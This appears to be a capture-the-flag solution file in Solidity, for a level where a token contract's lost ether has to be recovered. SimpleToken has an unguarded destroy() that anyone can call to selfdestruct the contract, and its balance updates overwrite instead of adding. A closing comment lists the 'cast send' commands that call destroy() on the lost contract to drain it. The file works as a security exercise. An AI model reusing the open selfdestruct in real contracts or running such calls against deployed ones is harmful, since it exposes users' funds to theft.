// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

/* 
source .env
export recovery=0x9F7de87275Cdb3E9034d97161FC56816a00E9CCd
Using explorer
export lost=0x1912513b66030f8b05dfc583822211070401e2a0
cast balance $lost --rpc-url $RPC_URL
cast send $lost "destroy(address)" 0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
